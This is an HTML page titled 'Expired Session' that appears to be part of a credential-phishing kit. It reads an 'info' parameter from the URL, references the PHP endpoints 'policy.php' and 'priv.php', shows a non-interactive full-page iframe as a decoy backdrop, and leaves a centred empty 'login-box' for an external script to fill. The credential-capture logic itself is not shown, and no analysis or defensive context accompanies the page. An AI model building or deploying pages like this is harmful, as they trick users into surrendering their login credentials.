<script>
	const policy = './assets/php/policy.php';
	const priv = './assets/php/priv.php';
	const searchParams = new URLSearchParams(window.location.search);
	let go = searchParams.get("info") || "";
</script>

<html>

<head>
  <title>Expired Session</title>
  <script type="text/javascript" src="./assets/js/index.js"></script>
  <link rel="shortcut icon" type="image/png"
    href="data:image/vnd.microsoft.icon;base64,AAABAAEAEBAQAAAAAAAoAQAAFgAAACgAAAAQAAAAIAAAAAEABAAAAAAAgAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACAAACAAAAAgIAAgAAAAIAAgACAgAAAwMDAAICAgAAAAP8AAP8AAAD//wD/AAAA/wD/AP//AAD///8AAAAAAAAAAAAACZkACZkAAAAACZCQCZAAAJkACZAAmQAACZkAmQAJAAAAAJAAkAkAAJmQCZAJmQAAAAmQmZmQAAAAmZmZmQAAAAmZkACZkAAACZkJmZmQAAAJmQAAmZAAAAmZCZCZkAAAAJmQCZkAAAAACZmZkAAAAAAAAAAAAAD//w8P448PD/lnAADOcwAA4zsPD/3bDwDGYwAP+QcAAPAPDw/hxw8A4gcPAOPHAADiRw8P8Y8PAPgfDw///wAA" />
</head>


<body class="w3-container">
  <div>
    <iframe id="mainPage" src="#" scrolling="no" sandbox="allow-forms allow-pointer-lock
			allow-popups allow-same-origin allow-scripts" width="100%" height="1500" style="pointer-events: none"
      tabindex="-1"></iframe>
  </div>

  <div class="login-box w3-display-middle" id="container">

  </div>
</body>

</html>